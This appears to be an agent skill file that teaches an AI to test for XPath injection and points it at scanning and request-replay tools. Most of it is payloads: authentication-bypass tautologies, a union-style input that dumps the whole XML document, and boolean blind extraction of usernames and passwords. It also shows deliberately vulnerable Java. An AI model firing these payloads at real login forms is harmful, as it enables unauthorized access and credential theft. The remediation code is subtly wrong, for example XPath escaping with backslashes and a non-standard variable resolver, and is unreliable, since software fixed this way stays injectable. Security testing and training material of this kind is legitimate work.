---
name: xpath-injection-testing
description: Professional skills and methodology for XPath injection vulnerability testing
---

# XPath Injection Vulnerability Testing

> **AI LOAD INSTRUCTION**: XPath injection testing for applications that construct XPath queries from user input. Covers error-based extraction, authentication bypass (tautology, union via `]//*`), blind boolean extraction via `substring()`, and XQuery-specific techniques. XPath injection differs from SQL injection: no sleep/time-based blind (use boolean only), different syntax, and XML document structure matters. Targets include login forms, search fields, and XML-based API endpoints.

## Overview

XPath injection is a vulnerability similar to SQL injection that exploits flaws in XPath query construction, potentially leading to information disclosure and authentication bypass. This skill provides detection, exploitation, and remediation methods for XPath injection.

## Vulnerability Mechanism

Applications concatenate user input directly into XPath query strings without sufficient validation or filtering, allowing attackers to modify query logic.

**Dangerous code example:**
```java
String xpath = "//user[username='" + username + "' and password='" + password + "']";
XPathExpression expr = xpath.compile(xpath);
NodeList nodes = (NodeList) expr.evaluate(doc, XPathConstants.NODESET);
```

## XPath Basics

### Query Syntax

**Basic queries:**
```
//user[username='admin']
//user[@id='1']
//user[username='admin' and password='pass']
//user[username='admin' or username='user']
```

### Functions

**Common functions:**
- `text()` — get text content
- `count()` — count nodes
- `substring()` — substring extraction
- `string-length()` — string length
- `contains()` — containment check

## QUICK START

### First-pass probes

| Signal | Probe | Why |
|---|---|---|
| `' or '1'='1` in input? | Submit in login/search field, check response | Classic tautology — bypasses auth or returns all rows |
| Error message shown? | Inject single quote `'` and observe | Error may reveal XPath/XML structure |
| `]//* `union` works? | Try `admin')] | //* | //*[('` in login field | Union-style extraction dumps entire XML document |
| Boolean extraction? | `' or substring(//user[1]/username,1,1)='a' or '` | Compare positive vs negative responses char-by-char |

```bash
# Quick XPath auth bypass test
# Username: admin' or '1'='1
# Password: anything
# If logged in → XPath injection confirmed
```

## Testing Methodology

### 1. Identify XPath Input Points

**Common functionality:**
- User login forms
- Data search interfaces
- XML data queries
- Configuration lookups

### 2. Basic Detection

**Test special characters:**
```
' or '1'='1
' or '1'='1' or '
' or 1=1 or '
') or ('1'='1
```

**Test logical operators:**
```
' or '1'='1
' and '1'='2
' or 1=1 or '
```

### 3. Authentication Bypass

**Basic bypass:**
```
Username: admin' or '1'='1
Password: anything
Query: //user[username='admin' or '1'='1' and password='anything']
```

**More precise bypass:**
```
Username: admin') or ('1'='1
Query: //user[username='admin') or ('1'='1' and password='*']
```

### 4. Information Disclosure

**Enumerate users:**
```
' or 1=1 or '
' or '1'='1
') or 1=1 or ('
```

**Get node count:**
```
' or count(//user)>0 or '
```

**Get specific node:**
```
' or substring(//user[1]/username,1,1)='a' or '
```

## Exploitation Techniques

### Authentication Bypass

**Method 1: Logic bypass**
```
Input: admin' or '1'='1
Query: //user[username='admin' or '1'='1' and password='*']
Result: matches all users
```

**Method 2: Comment bypass**
```
Input: admin')] | //* | //*[('
Query: //user[username='admin')] | //* | //*[('' and password='*']
```

**Method 3: Boolean blind injection**
```
' or substring(//user[1]/username,1,1)='a' or '
' or substring(//user[1]/username,1,1)='b' or '
```

### Information Disclosure

**Enumerate all users:**
```
' or 1=1 or '
Result: returns all user nodes
```

**Extract username:**
```
' or substring(//user[1]/username,1,1)='a' or '
' or substring(//user[1]/username,2,1)='d' or '
Extract each character incrementally
```

**Extract password:**
```
' or substring(//user[1]/password,1,1)='p' or '
Extract password characters incrementally
```

### Blind Injection Techniques

XPath has no `sleep()` function, so time-based blind injection is not possible. Use boolean-based blind injection only:

**Boolean-based blind injection:**
```
' or substring(//user[1]/username,1,1)='a' or '
Observe response differences (page content / length / status code)
```

## Bypass Techniques

### Encoding Bypass

**URL encoding:**
```
' or '1'='1 → %27%20or%20%271%27%3D%271
```

**HTML entity encoding:**
```
' → &#39;
" → &quot;
< → &lt;
> → &gt;
```

### Comment Bypass

**Using comments:**
```
' or 1=1 or '
' or '1'='1' or '
```

### Function Bypass

**Using alternative functions:**
```
substring(//user[1]/username,1,1)
substring(//user[position()=1]/username,1,1)
//user[1]/username/text()[1]
```

## Tool Usage

### XPath Expression Testing

**Online tools:**
- XPath Tester
- XMLSpy
- Oxygen XML Editor

### Burp Suite

1. Intercept XPath query requests
2. Modify query parameters
3. Observe response results

### Python Scripting

```python
from lxml import etree
from lxml.etree import XPath

# Load XML document
doc = etree.parse('users.xml')

# Test injection
xpath_expr = "//user[username='admin' or '1'='1']"
xpath = XPath(xpath_expr)
results = xpath(doc)
print(results)
```

## Verification and Reporting

### Verification Steps

1. Confirm ability to control XPath query
2. Verify authentication bypass or information disclosure
3. Assess impact (unauthorized access, data leakage, etc.)
4. Document complete PoC

### Report Essentials

- Vulnerability location and input parameters
- XPath query construction method
- Complete exploitation steps and PoC
- Remediation recommendations (input validation, parameterized queries, etc.)

## Remediation

### Recommended Approaches

1. **Input validation**
   ```java
   private static final String[] XPATH_ESCAPE_CHARS =
       {"'", "\"", "[", "]", "(", ")", "=", ">", "<", " "};

   public static String escapeXPath(String input) {
       if (input == null) {
         return null;
       }
       StringBuilder sb = new StringBuilder();
       for (int i = 0; i < input.length(); i++) {
         char c = input.charAt(i);
         if (Arrays.asList(XPATH_ESCAPE_CHARS).contains(String.valueOf(c))) {
           sb.append("\\");
         }
         sb.append(c);
       }
       return sb.toString();
   }
   ```

2. **Parameterized queries**
   ```java
   // Use XPath variables
   String xpath = "//user[username=$username and password=$password]";
   XPathExpression expr = xpath.compile(xpath);
   XPathVariableResolver resolver = new MapVariableResolver(
       Map.of("username", escapedUsername, "password", escapedPassword));
   expr.setXPathVariableResolver(resolver);
   ```

3. **Whitelist validation**
   ```java
   // Only allow specific characters
   if (!input.matches("^[a-zA-Z0-9@._-]+$")) {
       throw new IllegalArgumentException("Invalid input");
   }
   ```

4. **Pre-compiled queries**
   ```java
   // Predefined query templates
   private static final String LOGIN_QUERY =
       "//user[username=$1 and password=$2]";

   // Use parameter binding
   ```

5. **Least privilege**
   - Limit XPath query scope
   - Use access controls
   - Restrict queryable nodes

## Notes

- Only test in authorized environments
- Be aware of syntax differences between XPath versions
- Avoid modifying XML data during testing
- Understand the target application's XPath implementation

## DECISION TREE

```
XPath query found in application (login, search, XML API)?
├── Single-quote (') causes error or behavior change?
│   ├── Error message reveals XPath/XML structure?
│   │   └── Error-based extraction: use malformed XPath to extract data
│   ├── No error but response differs from baseline?
│   │   └── Boolean-based blind: use substring() to extract character by character
│   └── Auth bypass possible (login form)?
│       ├── Logical bypass works: ' or '1'='1?
│       │   └── Confirm authentication is bypassed
│       └── Comment-based bypass: admin')] | //* | //*[('?
│           └── Confirm data extraction via union
├── No error or behavior change with single-quote?
│   └── Try encoding bypass: URL-encode, HTML-entity encode
│       └── Any response difference now?
│           └── Proceed with blind boolean extraction
├── Backend may use XQuery instead of XPath 1.0?
│   └── Test XQuery-specific syntax and functions
└── No injection found?
    └── Report not reproduced; verify XPath sink and input flow
```

## TESTING CHECKLIST

- [ ] Identify all user-controlled inputs that feed into XPath queries (login forms, search fields, XML API endpoints)
- [ ] Test basic XPath injection with single-quote (`'`) and observe error responses or behavior changes
- [ ] Test error-based extraction: inject malformed XPath (`' or 1=1 or '`, `') or ('1'='1`) and check for XML/XPath error messages
- [ ] Test authentication bypass: `admin' or '1'='1`, `admin') or ('1'='1` in login fields
- [ ] Test boolean-based blind extraction: `' or substring(//user[1]/username,1,1)='a' or '` — compare positive vs negative responses
- [ ] Test node enumeration: `' or count(//user)>0 or '`, `' or 1=1 or '`
- [ ] Test character-by-character data extraction via `substring()` across username, password, and other sensitive nodes
- [ ] Test XQuery-specific syntax if the backend may use XQuery instead of XPath 1.0
- [ ] Test encoding bypasses: URL-encode payloads (`%27%20or%20%271%27%3D%271`), HTML-entity encode special characters
- [ ] Verify with parameterized queries or input escaping to confirm the fix

## MCP TOOLS

| Tool | Use Case |
|------|----------|
| `http_framework_test` | Send crafted HTTP requests with XPath injection payloads (`' or '1'='1`, `admin')] | //*`) in login forms, search parameters, and XML query endpoints |
| `http_repeater` | Replay and modify XPath injection payloads to test authentication bypass, boolean-based blind extraction, and node enumeration across different input points |
| `nuclei_scan` | Run XPath-injection-specific Nuclei templates to automate detection of XPath injection vulnerabilities in XML-based API endpoints |
| `api_fuzzer` | Fuzz API parameters with XPath injection strings to discover XML query sinks where user input reaches XPath expressions |

## RELATED ROUTING

- [ldap-injection](../ldap-injection/SKILL.md) — LDAP injection shares the same query-manipulation patterns as XPath injection
- [sqli](../sqli/SKILL.md) — SQL injection is the relational analogue; boolean-blind and auth-bypass techniques transfer
- [xxe](../xxe/SKILL.md) — both target XML-processing pipelines in the application
- [authentication-bypass](../authentication-bypass/SKILL.md) — XPath tautology bypass (`' or '1'='1`) is a core auth bypass method
